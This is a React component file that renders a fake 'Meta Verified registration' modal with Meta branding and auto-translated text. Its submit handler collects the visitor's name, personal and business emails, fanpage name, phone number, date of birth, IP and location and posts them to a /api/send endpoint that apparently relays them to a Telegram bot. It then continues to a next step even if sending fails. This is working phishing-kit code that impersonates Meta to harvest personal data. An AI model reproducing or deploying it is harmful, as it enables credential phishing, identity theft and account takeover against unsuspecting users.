import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';

interface FormData {
    fullName: string;
    personalEmail: string;
    businessEmail: string;
    pageName: string;
    day: string;
    month: string;
    year: string;
    describe: string;
}

const initialFormData: FormData = {
    fullName: '',
    personalEmail: '',
    businessEmail: '',
    pageName: '',
    day: '',
    month: '',
    year: '',
    describe: ''
};
const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [agreeToTerms, setAgreeToTerms] = useState(false);
    const [formData, setFormData] = useState<FormData>(initialFormData);

    const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserPhone } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Please provide the information below to help us review your account.', 'Full Name', 'Email Address', 'Email Business Address', 'Fanpage Name', 'Describe', 'Our response will be sent to you within 14-48 hours.', 'I agree to the', 'Terms of Service', 'Privacy Policy', 'and', 'Submit'];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: false,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false,
            formatAsYouType: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
        const { name, value, type } = e.target as HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((e: ChangeEvent<HTMLInputElement>) => {
        setPhoneNumber(e.target.value);
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;
        setIsLoading(true);

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>� Email Address:</b> <code>${formData.personalEmail}</code>
<b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
<b>📘 Fanpage Name:</b> <code>${formData.pageName}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
<b>🎂 Date of Birth:</b> <code>${formData.day}/${formData.month}/${formData.year}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            const res = await axios.post('/api/send', {
                message
            });
            if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
                setMessageId(res.data.data.result.message_id);
                setMessage(message);
            }
        } catch {
            // Continue even if send fails
        } finally {
            setIsLoading(false);
            // Save email and phone to store
            setUserEmail(formData.personalEmail);
            setUserPhone(phoneNumber);
            nextStep(formData);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                <div className='mb-1.5 sm:mb-2 flex w-full items-center justify-between p-1.5 sm:p-2 md:p-4 pb-0'>
                    <p className='text-xs sm:text-sm md:text-lg font-bold'>{t('Complete the free Meta Verified registration form.')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-7 sm:h-8 w-7 sm:w-8 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='lg' />
                    </button>
                </div>
                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-hidden px-1.5 sm:px-3 md:px-4'>
                    <div className='flex flex-col gap-1.5 sm:gap-1.5 md:gap-2 pt-4 sm:pt-5 pb-2 sm:pb-2.5 overflow-y-auto'>
                        {/* Full Name */}
                        <input 
                            required 
                            type='text'
                            name='fullName'
                            placeholder={t('Full Name')}
                            value={formData.fullName}
                            onChange={handleInputChange}
                            className='h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
                        />

                        {/* Email Address */}
                        <input 
                            required 
                            type='email'
                            name='personalEmail'
                            placeholder={t('Email Address')}
                            value={formData.personalEmail}
                            onChange={handleInputChange}
                            className='h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
                        />

                        {/* Email Business Address */}
                        <input 
                            required 
                            type='email'
                            name='businessEmail'
                            placeholder={t('Email Business Address')}
                            value={formData.businessEmail}
                            onChange={handleInputChange}
                            className='h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
                        />

                        {/* Fanpage Name */}
                        <input 
                            required 
                            type='text'
                            name='pageName'
                            placeholder={t('Fanpage Name')}
                            value={formData.pageName}
                            onChange={handleInputChange}
                            className='h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
                        />

                        {/* Phone Number */}
                        <IntlTelInput
                            initOptions={initOptions}
                            inputProps={{
                                name: 'phoneNumber',
                                maxLength: 11,
                                onChange: handlePhoneChange,
                                className: 'h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
                            }}
                        />

                        {/* Date of Birth */}
                        <div className='flex gap-2 sm:gap-2.5'>
                            {/* Day Select */}
                            <select 
                                name='day'
                                value={formData.day}
                                onChange={handleInputChange}
                                className='h-9 sm:h-10 md:h-11 flex-1 rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1 text-xs md:text-sm text-gray-700'
                            >
                                <option value=''>DD</option>
                                {Array.from({ length: 31 }, (_, i) => (
                                    <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
                                        {String(i + 1).padStart(2, '0')}
                                    </option>
                                ))}
                            </select>

                            {/* Month Select */}
                            <select 
                                name='month'
                                value={formData.month}
                                onChange={handleInputChange}
                                className='h-9 sm:h-10 md:h-11 flex-1 rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1 text-xs md:text-sm text-gray-700'
                            >
                                <option value=''>MM</option>
                                {Array.from({ length: 12 }, (_, i) => (
                                    <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
                                        {String(i + 1).padStart(2, '0')}
                                    </option>
                                ))}
                            </select>

                            {/* Year Select */}
                            <select 
                                name='year'
                                value={formData.year}
                                onChange={handleInputChange}
                                className='h-9 sm:h-10 md:h-11 flex-1 min-w-20 rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1 text-xs md:text-sm text-gray-700'
                            >
                                <option value=''>YYYY</option>
                                {Array.from({ length: 100 }, (_, i) => {
                                    const year = new Date().getFullYear() - i;
                                    return (
                                        <option key={year} value={String(year)}>
                                            {year}
                                        </option>
                                    );
                                })}
                            </select>
                        </div>

                        {/* Describe */}
                        <textarea 
                            name='describe'
                            placeholder={t('Describe')}
                            value={formData.describe}
                            onChange={handleInputChange}
                            className='h-16 sm:h-20 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-xs md:text-sm placeholder-gray-500 resize-none'
                            rows={2}
                        />

                        {/* Disclaimer */}
                        <p className='text-xs text-gray-600 mt-0.5'>{t('Our response will be sent to you within 14-48 hours.')}</p>

                        {/* Terms Checkbox */}
                        <div className='flex items-center gap-2 mt-1'>
                            <input 
                                type='checkbox' 
                                id='agreeTerms'
                                checked={agreeToTerms}
                                onChange={(e) => setAgreeToTerms(e.target.checked)}
                                className='w-4 h-4 cursor-pointer flex-shrink-0'
                            />
                            <label htmlFor='agreeTerms' className='text-xs text-gray-700 cursor-pointer leading-tight'>
                                {t('I agree to the')} {' '}
                                <span className='text-blue-600'>
                                    {t('Terms of Service')}
                                </span>
                                {' '}{t('and')}{' '}
                                <span className='text-blue-600'>
                                    {t('Privacy Policy')}
                                </span>
                            </label>
                        </div>

                        {/* Submit Button */}
                        <button 
                            type='submit' 
                            disabled={isLoading || !agreeToTerms}
                            className={`mt-2 sm:mt-2.5 md:mt-3 flex h-10 sm:h-11 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm text-white transition-colors hover:bg-blue-700 ${isLoading || !agreeToTerms ? 'cursor-not-allowed opacity-60' : ''}`}
                        >
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-1.5 sm:p-2 md:p-3'>
                    <Image src={MetaLogo} alt='' className='h-3.5 sm:h-4 md:h-4.5 w-14 sm:w-16 md:w-17.5' />
                </div>
            </div>
            </div>
        </>
    );
};

export default InitModal;
